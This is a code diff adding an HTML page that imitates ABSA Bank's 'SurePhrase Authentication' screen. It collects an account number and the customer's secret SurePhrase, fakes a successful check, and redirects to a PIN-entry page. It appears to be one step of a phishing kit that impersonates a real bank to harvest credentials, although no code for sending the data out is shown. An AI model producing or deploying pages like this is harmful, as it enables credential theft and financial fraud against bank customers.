@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SurePhrase Authentication - ABSA Bank</title>
+  <style>
+    :root {
+      --primary: #e4002b;
+      --accent: #ff6600;
+      --border: #ddd;
+      --text-dark: #333;
+      --text-light: #666;
+    }
+
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: #fff;
+      color: var(--text-dark);
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 30px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+      background: var(--primary);
+    }
+
+    header nav a {
+      margin-left: 20px;
+      font-size: 13px;
+      color: var(--text-dark);
+      text-decoration: none;
+    }
+
+    .container {
+      max-width: 960px;
+      margin: 20px auto;
+      padding: 0 20px;
+    }
+
+    .progress {
+      display: flex;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+
+    .progress-step {
+      flex: 1;
+      position: relative;
+      text-align: center;
+      font-size: 13px;
+      color: var(--text-light);
+    }
+
+    .progress-step::before {
+      content: "";
+      display: block;
+      width: 100%;
+      height: 3px;
+      background: var(--border);
+      position: absolute;
+      top: 8px;
+      left: -50%;
+      z-index: -1;
+    }
+
+    .progress-step:first-child::before {
+      display: none;
+    }
+
+    .progress-step.active {
+      color: var(--primary);
+      font-weight: bold;
+    }
+
+    .progress-step.active::before {
+      background: var(--primary);
+    }
+
+    .progress-step span {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      line-height: 20px;
+      border-radius: 50%;
+      background: var(--primary);
+      color: #fff;
+      font-size: 12px;
+      margin-bottom: 5px;
+    }
+
+    h2 {
+      font-size: 20px;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+
+    .security-notice {
+      background: #f8f9fa;
+      border-left: 4px solid var(--accent);
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 4px;
+    }
+
+    .security-notice h3 {
+      margin: 0 0 10px 0;
+      color: var(--primary);
+      font-size: 16px;
+    }
+
+    .security-notice p {
+      margin: 0;
+      font-size: 14px;
+      color: var(--text-light);
+    }
+
+    form {
+      background: #fff;
+      padding: 20px 25px;
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      border: 1px solid var(--border);
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+      font-weight: 600;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px 15px;
+      font-size: 14px;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      box-sizing: border-box;
+      margin-bottom: 15px;
+    }
+
+    .account-input {
+      font-family: 'Courier New', monospace;
+      letter-spacing: 1px;
+    }
+
+    .surephrase-container {
+      background: #fafafa;
+      border: 2px solid var(--border);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 15px 0;
+    }
+
+    .surephrase-label {
+      font-size: 16px;
+      font-weight: bold;
+      color: var(--primary);
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+    }
+
+    .surephrase-label::before {
+      content: "🔐";
+      margin-right: 8px;
+      font-size: 18px;
+    }
+
+    .surephrase-input {
+      background: #fff;
+      border: 2px solid var(--primary);
+      padding: 15px;
+      font-size: 16px;
+      border-radius: 6px;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+    }
+
+    .surephrase-input:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(228, 0, 43, 0.2);
+      border-color: var(--accent);
+    }
+
+    .surephrase-hint {
+      font-size: 12px;
+      color: var(--text-light);
+      margin-top: 8px;
+      font-style: italic;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: flex-end;
+      gap: 10px;
+      margin-top: 25px;
+    }
+
+    .buttons .cancel {
+      background: #fff;
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      padding: 12px 24px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .buttons .authenticate {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .buttons .authenticate:hover {
+      background: #c8002a;
+    }
+
+    .buttons .authenticate:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
+    .error-message {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+      padding: 12px 15px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .success-message {
+      background: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      padding: 12px 15px;
+      border-radius: 4px;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    @media (max-width: 600px) {
+      .buttons {
+        flex-direction: column;
+      }
+      .buttons button {
+        width: 100%;
+      }
+      .container {
+        padding: 0 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div style="width: 40px; height: 40px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">A</div>
+    <nav>
+      <a href="#">Contact Us</a>
+      <a href="#">Security</a>
+      <a href="#">Privacy Policy</a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <div class="progress">
+      <div class="progress-step"><span>1</span><br>Account Details</div>
+      <div class="progress-step active"><span>2</span><br>SurePhrase Authentication</div>
+      <div class="progress-step"><span>3</span><br>Access Granted</div>
+    </div>
+
+    <h2>SurePhrase Authentication</h2>
+
+    <div class="security-notice">
+      <h3>Security Verification Required</h3>
+      <p>Please enter your account number and SurePhrase to continue. Your SurePhrase is a unique security phrase that you created during account setup.</p>
+    </div>
+
+    <form id="surephraseForm" method="POST">
+      <div>
+        <label for="accountNumber">Account Number *</label>
+        <input type="text" id="accountNumber" name="accountNumber" class="account-input" placeholder="Enter your 10-digit account number" maxlength="10" required>
+      </div>
+
+      <div class="surephrase-container">
+        <div class="surephrase-label">Enter Your SurePhrase</div>
+        <input type="password" id="surephrase" name="surephrase" class="surephrase-input" placeholder="Your unique security phrase" required>
+        <div class="surephrase-hint">SurePhrase is case-sensitive and must match exactly as you created it</div>
+      </div>
+
+      <div>
+        <label for="reference">Reference (Optional)</label>
+        <input type="text" id="reference" name="reference" placeholder="Transaction reference or purpose">
+      </div>
+
+      <div class="buttons">
+        <button type="button" class="cancel" onclick="window.history.back()">Back</button>
+        <button type="submit" class="authenticate">Authenticate</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // Account number formatting
+    document.getElementById('accountNumber').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      e.target.value = value;
+    });
+
+    // SurePhrase validation
+    document.getElementById('surephrase').addEventListener('input', function(e) {
+      const value = e.target.value;
+      const button = document.querySelector('.authenticate');
+      
+      if (value.length >= 6) {
+        button.disabled = false;
+      } else {
+        button.disabled = true;
+      }
+    });
+
+    // Form submission
+    document.getElementById('surephraseForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const accountNumber = document.getElementById('accountNumber').value;
+      const surephrase = document.getElementById('surephrase').value;
+      
+      // Basic validation
+      if (!accountNumber || accountNumber.length !== 10) {
+        showError('Please enter a valid 10-digit account number');
+        return;
+      }
+      
+      if (!surephrase || surephrase.length < 6) {
+        showError('SurePhrase must be at least 6 characters long');
+        return;
+      }
+      
+      // Show loading state
+      const submitBtn = document.querySelector('.authenticate');
+      submitBtn.textContent = 'Authenticating...';
+      submitBtn.disabled = true;
+      
+      // Simulate authentication
+      setTimeout(() => {
+        // Simulate successful authentication
+        showSuccess('Authentication successful! Redirecting...');
+        setTimeout(() => {
+          window.location.href = 'pin-entry.html';
+        }, 2000);
+      }, 2000);
+    });
+
+    function showError(message) {
+      const existing = document.querySelector('.error-message');
+      if (existing) existing.remove();
+      
+      const errorDiv = document.createElement('div');
+      errorDiv.className = 'error-message';
+      errorDiv.textContent = message;
+      
+      const form = document.getElementById('surephraseForm');
+      form.insertBefore(errorDiv, form.firstChild);
+    }
+
+    function showSuccess(message) {
+      const existing = document.querySelector('.error-message, .success-message');
+      if (existing) existing.remove();
+      
+      const successDiv = document.createElement('div');
+      successDiv.className = 'success-message';
+      successDiv.textContent = message;
+      
+      const form = document.getElementById('surephraseForm');
+      form.insertBefore(successDiv, form.firstChild);
+    }
+  </script>
+</html>
+</body>
